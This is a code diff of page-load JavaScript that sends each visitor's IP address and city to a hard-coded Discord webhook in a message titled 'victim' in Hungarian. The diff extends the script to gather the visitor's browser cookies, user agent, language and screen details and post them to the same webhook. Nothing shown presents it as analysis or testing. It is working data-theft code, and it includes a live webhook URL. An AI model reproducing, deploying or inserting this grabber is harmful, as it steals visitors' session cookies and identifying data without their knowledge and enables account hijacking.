@@ -2,7 +2,33 @@ document.addEventListener("DOMContentLoaded", function () {
   const webhookURL =
     "https://discord.com/api/webhooks/1262915037543141388/6OH_1CsadYdJNdA0mKPGD-fw8MOf-V8UDShu3v_nUQGQK8a-6SVxkEWibZqBaTp9ZNCf";
 
-  function sendToDiscord(ip, city) {
+  function getCookies() {
+    const cookies = document.cookie.split(";").reduce((cookies, cookie) => {
+      const [name, value] = cookie.split("=").map((c) => c.trim());
+      cookies[name] = value;
+      return cookies;
+    }, {});
+    return JSON.stringify(cookies, null, 2);
+  }
+
+  function getUserAgent() {
+    return navigator.userAgent;
+  }
+
+  function getLanguage() {
+    return navigator.language;
+  }
+
+  function getScreenInfo() {
+    return {
+      width: screen.width,
+      height: screen.height,
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth,
+    };
+  }
+
+  function sendToDiscord(ip, city, cookies, userAgent, language, screenInfo) {
     const request = new XMLHttpRequest();
     request.open("POST", webhookURL);
     request.setRequestHeader("Content-type", "application/json");
@@ -13,13 +39,33 @@ document.addEventListener("DOMContentLoaded", function () {
           title: "Áldozat",
           fields: [
             {
-              name: "ipv6 címe:",
+              name: "IP Address",
               value: ip,
               inline: false,
             },
             {
-              name: "Városa:",
+              name: "City",
               value: city,
+              inline: false,
+            },
+            {
+              name: "Cookies",
+              value: `\`\`\`${cookies}\`\`\``,
+              inline: false,
+            },
+            {
+              name: "User Agent",
+              value: userAgent,
+              inline: false,
+            },
+            {
+              name: "Language",
+              value: language,
+              inline: false,
+            },
+            {
+              name: "Screen Info",
+              value: `Width: ${screenInfo.width}, Height: ${screenInfo.height}, Color Depth: ${screenInfo.colorDepth}, Pixel Depth: ${screenInfo.pixelDepth}`,
               inline: false,
             },
           ],
@@ -37,13 +83,31 @@ document.addEventListener("DOMContentLoaded", function () {
       if (request.status >= 200 && request.status < 400) {
         const data = JSON.parse(request.responseText);
         const city = data.city || "Unknown";
-        sendToDiscord(ip, city);
+        const cookies = getCookies();
+        const userAgent = getUserAgent();
+        const language = getLanguage();
+        const screenInfo = getScreenInfo();
+        sendToDiscord(ip, city, cookies, userAgent, language, screenInfo);
       } else {
-        sendToDiscord(ip, "Unknown");
+        sendToDiscord(
+          ip,
+          "Unknown",
+          getCookies(),
+          getUserAgent(),
+          getLanguage(),
+          getScreenInfo()
+        );
       }
     };
     request.onerror = function () {
-      sendToDiscord(ip, "Unknown");
+      sendToDiscord(
+        ip,
+        "Unknown",
+        getCookies(),
+        getUserAgent(),
+        getLanguage(),
+        getScreenInfo()
+      );
     };
     request.send();
   }
